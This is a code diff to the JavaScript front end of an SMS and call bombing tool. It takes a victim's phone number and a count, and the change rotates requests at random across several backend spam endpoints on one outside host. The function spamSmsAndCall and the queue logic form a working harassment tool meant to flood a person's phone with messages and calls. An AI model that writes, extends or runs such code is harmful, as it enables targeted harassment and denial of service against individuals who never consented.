@@ -1,6 +1,16 @@
 let queue = [];
 let processing = false;
 
+// List of URLs
+const urls = [
+    'https://quang.nqtool.net/?',
+    'https://quang.nqtool.net/index1.php?',
+    'https://quang.nqtool.net/index2.php?',
+    'https://quang.nqtool.net/index3.php?',
+    'https://quang.nqtool.net/index4.php?'
+    // Add more URLs as needed
+];
+
 function addToQueue() {
     const phone = document.getElementById('phone').value;
     const times = document.getElementById('times').value;
@@ -31,7 +41,10 @@ function processQueue() {
 }
 
 function spamSmsAndCall(phone, times, listItem) {
-    const url = `https://quang.nqtool.net?phone=${phone}&amout=${times}`;
+    // Randomly select a URL from the list
+    const randomUrl = urls[Math.floor(Math.random() * urls.length)];
+    const url = `${randomUrl}phone=${phone}&amout=${times}`;
+    
     fetch(url)
         .then(response => response.json())
         .then(data => {
